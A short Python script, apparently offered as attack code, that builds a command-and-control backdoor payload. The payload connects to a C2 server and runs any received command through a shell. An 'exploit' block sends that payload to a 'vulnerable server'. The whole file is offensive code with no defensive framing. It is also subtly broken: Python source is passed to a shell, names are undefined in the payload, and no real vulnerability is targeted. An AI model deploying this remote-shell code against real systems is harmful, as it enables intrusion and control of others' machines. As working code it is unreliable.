import socket
import subprocess

# Define the C2 server IP and port
C2_SERVER_IP = "192.168.1.100"
C2_SERVER_PORT = 8080

# Define the payload
payload = """
import os
import socket

# Connect to the C2 server
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((C2_SERVER_IP, C2_SERVER_PORT))

# Send the payload to the C2 server
sock.sendall(b"Hello, C2 server!")

# Receive commands from the C2 server
while True:
    command = sock.recv(1024)
    if command == b"exit":
        break
    subprocess.Popen(command.decode(), shell=True)

# Close the socket
sock.close()
"""

# Define the exploit
exploit = """
import os
import socket

# Create a socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the vulnerable server
sock.connect(("192.168.1.200", 80))

# Send the payload to the vulnerable server
sock.sendall(payload.encode())

# Receive the response from the vulnerable server
response = sock.recv(1024)

# Print the response
print(response.decode())

# Close the socket
sock.close()
"""

# Execute the exploit
subprocess.Popen(exploit, shell=True)
